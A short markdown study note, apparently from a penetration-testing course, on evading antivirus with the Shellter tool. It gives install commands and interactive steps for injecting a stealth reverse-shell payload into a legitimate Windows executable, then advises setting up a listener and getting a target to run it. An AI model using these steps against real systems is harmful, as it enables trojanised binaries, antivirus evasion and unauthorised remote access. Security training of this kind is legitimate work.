# Obfuscation

## AV Evasion With Shellter

* https://www.shellterproject.com/
```
sudo apt-get install shellter -y
```
* Windows exe, so you need wine to run Shellter on Linux
* Sheller only supports x86, so you need the 32 bit version of Wine
```
sudo dpkg --add-architecture i386
```
```
sudo apt-get install wine32
```
```
cd /usr/share/windows-resources/shellter
```


Get a legit exe to put malicious payload into:
```
cd /usr/share/windows-binaries/
```

Execute .exe on Linux:
```
sudo wine shellter.exe
```
```
A
```
```
[PATCH-TO-LEGIT-EXE]
```
Enable Stealth Mode? (exe runs in background? Y or N)
```
Y
```
Listed or Custom Payload?
```
```
L
```
[PAYLOAD-INDEX]
```
```
[IP-ADDRESS]
```
```
[LPORT]
```
Enter to continue...

*The legit exe has been replaced by malicious exe*

* Now set up a listener and get target to run the exe


***********************************************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2